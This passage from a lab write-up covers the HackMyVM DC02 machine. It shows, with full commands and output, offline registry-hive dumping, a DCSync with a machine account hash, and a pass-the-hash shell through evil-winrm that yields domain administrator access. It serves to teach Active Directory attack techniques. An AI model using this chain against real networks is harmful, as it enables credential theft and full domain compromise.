With the database hives safely transferred to our local attacker machine, we can parse them completely offline. We run Impacket's `secretsdump` locally, passing our retrieved `SAM.save`, `SECURITY.save`, and `SYSTEM.save` hives to extract the local user accounts and secrets.
```bash
┌──(emvee㉿kali)-[~/Documents/DC02]
└─$ impacket-secretsdump -sam SAM.save -security SECURITY.save -system SYSTEM.save LOCAL
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0x0c7ad5e1334e081c4dfecd5d77cc2fc6
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:209c6174da490caeb422f3fa5a7ae634:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
$MACHINE.ACC:plain_password_hex:3303e8f54bc03dcac0eaa780757e2794e4564d9c4c383bcd4921224002984466870717e6a766b616c25e8db81c8e962a4e4487a8f0e8f743ca29df351535ba928fc13e4248d54ee95cb4cf2428856c09f7451ffbbcad42ca76ab6b48f169be2803dc2e160e690f03ff200a5b4022d26f2475b2ce0888b818bc482584b9100f9faf243914953ca8079a57c8516ffc9590527b9b66ccd3f439e005a3a6f452a2890ab36fe42c32ef503d9fd3e8217b0d6cf529c4de32f0f18ff411b5d6c84a7068018221f8642e31f72c0dffcdd1db77e2c9cdec86aa5d8bd734617498f974f73b641f440b89d8c2d8b024017d5e94b755
$MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:b635e7f8859a1be970b5010e39984c1b
[*] DPAPI_SYSTEM 
dpapi_machinekey:0x829d1c0e3b8fdffdc9c86535eac96158d8841cf4
dpapi_userkey:0x4813ee82e68a3bf9fec7813e867b42628ccd9503
[*] NL$KM 
 0000   44 C5 ED CE F5 0E BF 0C  15 63 8B 8D 2F A3 06 8F   D........c../...
 0010   62 4D CA D9 55 20 44 41  75 55 3E 85 82 06 21 14   bM..U DAuU>...!.
 0020   8E FA A1 77 0A 9C 0D A4  9A 96 44 7C FC 89 63 91   ...w......D|..c.
 0030   69 02 53 95 1F ED 0E 77  B5 24 17 BE 6E 80 A9 91   i.S....w.$..n...
NL$KM:44c5edcef50ebf0c15638b8d2fa3068f624dcad95520444175553e85820621148efaa1770a9c0da49a96447cfc896391690253951fed0e77b52417be6e80a991
[*] Cleaning up...
```
The offline dump completes successfully, exposing the local database secrets and yielding the NT hash for the local Administrator account:
- Username:`Administrator`
- RID: `500`
- NT Hash: `209c6174da490caeb422f3fa5a7ae634`

## Privilege escalation and initial access (remotely)
Another interesting part is that we can see an computer account. The computer account `DC01$` possesses the necessary replication privileges within the Active Directory domain architecture. By using this computer name and its corresponding NT hash (`b635e7f8859a1be970b5010e39984c1b`), we can initiate a DCSync attack using Impacket's `secretsdump`. This allows us to masquerade as a synchronizing Domain Controller and pull the actual domain user hashes (including the genuine Domain Administrator account) straight out of the active Active Directory directory database.
```bash
┌──(emvee㉿kali)-[~/Documents/DC02]
└─$ impacket-secretsdump -hashes :b635e7f8859a1be970b5010e39984c1b SOUPEDECODE.LOCAL/DC01\$@10.0.2.12 > dcsync.output
                                                                                                                                                                                                                                            
┌──(emvee㉿kali)-[~/Documents/DC02]
└─$ wc dcsync.output 
  4264   4298 374539 dcsync.output
```
With the replication synchronization process completed, we check the top lines of our output file to grab the extracted hashes.
```bash
┌──(emvee㉿kali)-[~/Documents/DC02]
└─$ head dcsync.output                                                       
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:8982babd4da89d33210779a6c5b078bd:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:fb9d84e61e78c26063aced3bf9398ef0:::
soupedecode.local\bmark0:1103:aad3b435b51404eeaad3b435b51404ee:d72c66e955a6dc0fe5e76d205a630b15:::
soupedecode.local\otara1:1104:aad3b435b51404eeaad3b435b51404ee:ee98f16e3d56881411fbd2a67a5494c6:::
```
The DCSync bypass worked perfectly. We successfully exfiltrated the authentic Domain Administrator NT hash: `8982babd4da89d33210779a6c5b078bd`.

With the genuine domain administrator hash in our possession, we can perform a final Pass the Hash (PtH) attack against the WinRM service using `evil-winrm`. Since this account holds true enterprise level administrative rights over the active domain environment, the authentication endpoint grants full execution privileges.
```bash
┌──(emvee㉿kali)-[~/Documents/DC02]
└─$ evil-winrm -i DC01.SOUPEDECODE.LOCAL -u 'Administrator' -H '8982babd4da89d33210779a6c5b078bd'                                      
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami;hostname;ipconfig;type c:\users\administrator\desktop\root.txt
soupedecode\administrator
DC01

Windows IP Configuration


Ethernet adapter Ethernet:

   Connection-specific DNS Suffix  . :
   Link-local IPv6 Address . . . . . : fe80::8133:4c16:e53a:8975%4
   IPv4 Address. . . . . . . . . . . : 10.0.2.12
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 10.0.2.1
HERE IS THE ROOT FLAG
*Evil-WinRM* PS C:\Users\Administrator\Documents> 

```
The shell drops us straight into the target system with a fully elevated context. Running our verification commands confirms that we are acting as `soupedecode\administrator` on host `DC01`. We can successfully read the final `root.txt` file from the administrative desktop, completing the full compromise of the HackMyVM DC02 laboratory machine.

## Conclusion & final thoughts
The DC02 machine from HackMyVM provided an excellent demonstration of an Active Directory attack chain, illustrating how minor flaws like a weak credential pair (`charlie:charlie`) found via Kerberos enumeration can escalate into a full domain compromise. By utilizing these initial credentials, we performed an AS-REP roasting attack to harvest the hash of `zximena448`, a high-value account belonging to the Backup Operators group. Although traditional remote code execution tools like `psexec` and `wmiexec` were heavily restricted by security policies, we successfully abused the underlying `SeBackupPrivilege` to extract the local registry hives over SMB. This allowed us to recover the machine account hash (`DC01$`) and execute a final DCSync attack to dump the Domain Administrator credentials, proving that raw filesystem read access is often more than enough to fully dismantle an Active Directory infrastructure.
